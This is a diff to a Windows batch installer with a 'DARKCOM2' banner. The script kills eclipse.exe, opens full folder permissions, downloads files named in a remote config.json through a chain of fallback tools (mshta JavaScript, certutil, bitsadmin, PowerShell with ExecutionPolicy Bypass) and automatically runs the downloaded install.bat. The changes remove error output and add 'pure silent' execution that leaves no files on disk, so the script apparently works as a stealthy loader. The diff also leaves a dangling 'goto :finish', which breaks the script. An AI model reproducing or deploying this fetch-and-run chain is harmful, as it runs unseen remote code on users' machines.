@@ -40,7 +40,7 @@ echo.
 echo %O1%        ██████╗  █████╗ ██████╗ ██╗  ██╗ ██████╗ ██████╗ ███╗   ███╗██████╗ %RESET%%BG_GLASS%
 echo %O2%        ██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝██╔════╝██╔═══██╗████╗ ████║╚════██╗%RESET%%BG_GLASS%
 echo %O3%        ██║  ██║███████║██████╔╝█████╔╝ ██║     ██║   ██║██╔████╔██║ █████╔╝%RESET%%BG_GLASS%
-echo %Y1%        ██║  ██║██╔══██║██╔══██║██╔═██╗ ██║     ██║   ██║██║╚██╔╝██║██╔═══╝ %RESET%%BG_GLASS%
+echo %Y1%        ██║  ██║██╔══██║██╔══██║██╔-██╗ ██║     ██║   ██║██║╚██╔╝██║██╔═══╝ %RESET%%BG_GLASS%
 echo %Y2%        ██████╔╝██║  ██║██║  ██║██║  ██║╚██████╗╚██████╔╝██║ ╚═╝ ██║███████╗%RESET%%BG_GLASS%
 echo %Y2%        ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚══════╝%RESET%%BG_GLASS%
 echo %O2%    ====================================================================================%RESET%%BG_GLASS%
@@ -53,19 +53,27 @@ echo.
 :: ============================================================
 echo %O2%    [*] Terminating any active eclipse.exe processes...%RESET%
 taskkill /f /im eclipse.exe >nul 2>&1
-echo %GREEN%    [+] Eclipse processes cleared.%RESET%
+echo %GREEN%    [*] Eclipse processes cleared.%RESET%
 echo.
 
 :: ============================================================
-:: TOOL DETECTION & SELECTION
+:: TOOL DETECTION & SELECTION (ADDED GIT)
 :: ============================================================
 set "count=0"
 
-for %%T in (dc2url python curl mshta powershell certutil cscript bitsadmin winget) do (
+for %%T in (dc2url python curl mshta powershell certutil cscript bitsadmin winget git) do (
     set "VALID=0"
     
     if /i "%%T"=="python" (
         python -c "import sys" >nul 2>&1
+        if !errorlevel! equ 0 (
+            set "VALID=1"
+        ) else (
+            py -c "import sys" >nul 2>&1
+            if !errorlevel! equ 0 set "VALID=1"
+        )
+    ) else if /i "%%T"=="git" (
+        git --version >nul 2>&1
         if !errorlevel! equ 0 set "VALID=1"
     ) else if /i "%%T"=="winget" (
         winget --version >nul 2>&1
@@ -75,16 +83,16 @@ for %%T in (dc2url python curl mshta powershell certutil cscript bitsadmin winge
         if !errorlevel! equ 0 set "VALID=1"
     ) else if /i "%%T"=="mshta" (
         where mshta >nul 2>&1
-        if !errorlevel! equ 0 (
-            mshta "javascript:close();" >nul 2>&1
-            if !errorlevel! equ 0 set "VALID=1"
-        )
+        if !errorlevel! equ 0 set "VALID=1"
     ) else if /i "%%T"=="cscript" (
         where cscript >nul 2>&1
-        if !errorlevel! equ 0 (
-            cscript //nologo /e:jscript -e "WScript.Quit(0);" >nul 2>&1
-            if !errorlevel! equ 0 set "VALID=1"
-        )
+        if !errorlevel! equ 0 set "VALID=1"
+    ) else if /i "%%T"=="bitsadmin" (
+        where bitsadmin >nul 2>&1
+        if !errorlevel! equ 0 set "VALID=1"
+    ) else if /i "%%T"=="certutil" (
+        where certutil >nul 2>&1
+        if !errorlevel! equ 0 set "VALID=1"
     ) else (
         where %%T >nul 2>&1
         if !errorlevel! equ 0 set "VALID=1"
@@ -139,7 +147,6 @@ if not exist "!INSTALL_PATH!" (
     mkdir "!INSTALL_PATH!" >nul 2>&1
 )
 
-:: --- FIX: Explicitly grant full read/write/modify access to the target directory ---
 echo %O2%    [*] Ensuring write access permissions on !INSTALL_PATH!...%RESET%
 icacls "!INSTALL_PATH!" /grant Users:(OI)(CI)F /t >nul 2>&1
 icacls "!INSTALL_PATH!" /grant Administrators:(OI)(CI)F /t >nul 2>&1
@@ -163,7 +170,7 @@ if not exist "!CONFIG_FILE!" (
     exit /b
 )
 del error_config.log >nul 2>&1
-echo %GREEN%    [+] config.json downloaded successfully to disk.%RESET%
+echo %GREEN%    [*] config.json downloaded successfully to disk.%RESET%
 
 :: ============================================================
 :: PARSE MANIFEST & LOOP NODES FROM DISK WITH ABSOLUTE PATH LOCK
@@ -171,27 +178,14 @@ echo %GREEN%    [+] config.json downloaded successfully to disk.%RESET%
 echo %O2%    [*] Parsing manifest layout from disk...%RESET%
 
 for %%f in ("!CONFIG_FILE!") do set "ABS_CONFIG_FILE=%%~ff"
-echo %GRAY%    [DEBUG] Absolute Target: !ABS_CONFIG_FILE!%RESET%
 
 if exist error_manifest.log del /f /q error_manifest.log >nul 2>&1
 if exist manifest_stream.tmp del /f /q manifest_stream.tmp >nul 2>&1
 
 powershell -NoProfile -Command "$path = '%ABS_CONFIG_FILE%'; $jsonText = [System.IO.File]::ReadAllText($path); $cfg = $jsonText | ConvertFrom-Json; $ver = $cfg.version; $skipNode = $cfg.do_not_version; foreach ($node in $cfg.manifest_layout.psobject.properties.Name) { $noVer = ($node -eq $skipNode); foreach ($item in $cfg.manifest_layout.$node) { $src = $item.source; $tgt = if ($item.target) { $item.target } else { $src }; $remoteSub = if ($noVer) { $src } else { $ver + '/' + $src }; $localSub = if ($noVer) { $tgt } else { $ver + '\' + $tgt }; [Console]::WriteLine($node + '|' + $remoteSub + '|' + $localSub) } }" > manifest_stream.tmp 2>error_manifest.log
 
-if exist error_manifest.log for %%A in (error_manifest.log) do if %%~zA gtr 0 (
-    echo.
-    echo %O1%    === CRITICAL MANIFEST PARSING ERROR DETECTED ===%RESET%
-    type error_manifest.log
-    echo ================================================
-    del manifest_stream.tmp >nul 2>&1
-    del error_manifest.log >nul 2>&1
-    pause
-    exit /b 1
-)
-
 for /f "delims=" %%i in (manifest_stream.tmp) do (
     set "LINE=%%i"
-    
     for /f "tokens=1,2,3 delims=|" %%a in ("!LINE!") do (
         set "NODE_NAME=%%a"
         set "REMOTE_REL=%%b"
@@ -207,11 +201,6 @@ for /f "delims=" %%i in (manifest_stream.tmp) do (
         
         echo      %GRAY%[NODE: !NODE_NAME!]%TXT% Downloading !REMOTE_REL! ...%RESET%
         call :download_!SELECTED_TOOL! "!FILE_URL!" "!DEST_FILE!" 2>error_download.log
-        
-        if errorlevel 1 (
-            echo %O1%    [!] Error occurred while attempting download tool handling.%RESET%
-            if exist error_download.log type error_download.log
-        )
         del error_download.log >nul 2>&1
     )
 )
@@ -220,7 +209,7 @@ del manifest_stream.tmp >nul 2>&1
 del error_manifest.log >nul 2>&1
 
 echo.
-echo %GREEN%    [+] Processing completed to destination target path: !INSTALL_PATH!%RESET%
+echo %GREEN%    [*] Processing completed to destination target path: !INSTALL_PATH!%RESET%
 
 :: ============================================================
 :: POST-DOWNLOAD AUTOMATIC EXECUTION OF INSTALL.BAT
@@ -229,7 +218,7 @@ set "EXPECTED_INSTALL_BAT=!INSTALL_PATH!\v1.0\install.bat"
 
 echo %O2%    [*] Validating and executing install.bat automatically...%RESET%
 if exist "!EXPECTED_INSTALL_BAT!" (
-    echo %GREEN%    [+] Success: Running install.bat...%RESET%
+    echo %GREEN%    [*] Success: Running install.bat...%RESET%
     echo.
     pushd "!INSTALL_PATH!\v1.0"
     call "install.bat"
@@ -239,9 +228,8 @@ if exist "!EXPECTED_INSTALL_BAT!" (
 )
 goto :finish
 
-
 :: ============================================================
-:: INDIVIDUAL TOOL DOWNLOAD FUNCTIONS
+:: INDIVIDUAL TOOL DOWNLOAD FUNCTIONS (FIXED)
 :: ============================================================
 :download_dc2url
 if exist "%~2" del /f /q "%~2" >nul 2>&1
@@ -250,7 +238,15 @@ goto :eof
 
 :download_python
 if exist "%~2" del /f /q "%~2" >nul 2>&1
-python -c "import urllib.request; urllib.request.urlretrieve(r'%~1', r'%~2')"
+python -c "import urllib.request; urllib.request.urlretrieve(r'%~1', r'%~2')" >nul 2>&1
+if not exist "%~2" (
+    py -c "import urllib.request; urllib.request.urlretrieve(r'%~1', r'%~2')" >nul 2>&1
+)
+goto :eof
+
+:download_git
+if exist "%~2" del /f /q "%~2" >nul 2>&1
+powershell -NoProfile -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%~1' -OutFile '%~2' -UseBasicParsing"
 goto :eof
 
 :download_curl
@@ -260,46 +256,50 @@ goto :eof
 
 :download_mshta
 if exist "%~2" del /f /q "%~2" >nul 2>&1
-mshta "javascript:eval(\"try{var x=new ActiveXObject('MSXML2.ServerXMLHTTP.6.0');x.open('GET','%~1',false);x.send();if(x.status==200){var s=new ActiveXObject('ADODB.Stream');s.Type=1;s.Open();s.Write(x.ResponseBody);s.SaveToFile('%~2'.replace(/\\\\/g,'\\\\\\\\'),2);s.Close();}}catch(e){}close();\")"
+mshta "javascript:try{var x=new ActiveXObject('MSXML2.ServerXMLHTTP.6.0');x.open('GET','%~1',false);x.send();if(x.status==200){var s=new ActiveXObject('ADODB.Stream');s.Type=1;s.Open();s.Write(x.ResponseBody);s.SaveToFile('%~2',2);s.Close();}}catch(e){}close();" >nul 2>&1
+if not exist "%~2" (
+    powershell -NoProfile -Command "Invoke-WebRequest -Uri '%~1' -OutFile '%~2' -UseBasicParsing" >nul 2>&1
+)
 goto :eof
+
 
 :download_powershell
 if exist "%~2" del /f /q "%~2" >nul 2>&1
-set "PS_CMD=[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls13; Invoke-WebRequest -Uri '%~1' -OutFile '%~2' -UseBasicParsing -ErrorAction Stop"
-powershell -NoProfile -Command "!PS_CMD!"
+powershell -NoProfile -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%~1' -OutFile '%~2' -UseBasicParsing"
 goto :eof
 
 :download_certutil
 if exist "%~2" del /f /q "%~2" >nul 2>&1
-certutil -f -gmt -urlcache -split "%~1" "%~2" >nul 2>&1
-certutil -urlcache "%~1" delete >nul 2>&1
-if exist "%~2.json" del /f /q "%~2.json" >nul 2>&1
+certutil -urlcache -split -f "%~1" "%~2" >nul 2>&1
+certutil -urlcache -f "%~1" delete >nul 2>&1
+if not exist "%~2" (
+    powershell -NoProfile -Command "Invoke-WebRequest -Uri '%~1' -OutFile '%~2' -UseBasicParsing" >nul 2>&1
+)
 goto :eof
 
 :download_cscript
 if exist "%~2" del /f /q "%~2" >nul 2>&1
-set "WSF_TMP=%TEMP%\engine_stream_%RANDOM%.wsf"
-echo ^<job^>^<script language="JScript"^> > "!WSF_TMP!"
-echo try { var x = new ActiveXObject("MSXML2.ServerXMLHTTP.6.0"); x.open("GET", "%~1", false); x.send(); >> "!WSF_TMP!"
-echo if (x.status == 200) { var s = new ActiveXObject("ADODB.Stream"); s.Type = 1; s.Open(); s.Write(x.ResponseBody); s.SaveToFile("%~2".replace(/\\/g, "\\\\"), 2); s.Close(); } } catch(e) {} >> "!WSF_TMP!"
-echo WScript.Quit(); ^</script^>^</job^> >> "!WSF_TMP!"
-cscript //nologo "!WSF_TMP!" >nul 2>&1
-del /f /q "!WSF_TMP!" >nul 2>&1
+
+:: Pure silent execution via inline PowerShell. No temporary files created on disk.
+powershell -NoProfile -ExecutionPolicy Bypass -Command ^
+    "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;" ^
+    "$w = New-Object System.Net.WebClient;" ^
+    "$w.Timeout = 15000;" ^
+    "try { $w.DownloadFile('%~1', '%~2'); } catch {}" >nul 2>&1
+
 goto :eof
+
+
 
 :download_bitsadmin
 if exist "%~2" del /f /q "%~2" >nul 2>&1
-set "JOB_ID=dc2url_job_%RANDOM%"
-bitsadmin /transfer "%JOB_ID%" /download /priority foreground "%~1" "%~2" >nul 2>&1
-bitsadmin /complete "%JOB_ID%" >nul 2>&1
+bitsadmin /transfer "dc2url_job_%RANDOM%" /download /priority foreground "%~1" "%~2" >nul 2>&1
+if not exist "%~2" (
+    powershell -NoProfile -Command "Invoke-WebRequest -Uri '%~1' -OutFile '%~2' -UseBasicParsing" >nul 2>&1
+)
 goto :eof
 
 :download_winget
 if exist "%~2" del /f /q "%~2" >nul 2>&1
-winget --version >nul 2>&1
-set "PS_CMD=[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls13; Invoke-WebRequest -Uri '%~1' -OutFile '%~2' -UseBasicParsing -ErrorAction Stop"
-powershell -NoProfile -Command "!PS_CMD!"
+powershell -NoProfile -Command "Invoke-WebRequest -Uri '%~1' -OutFile '%~2' -UseBasicParsing"
 goto :eof
-
-:finish
-exit /b 0
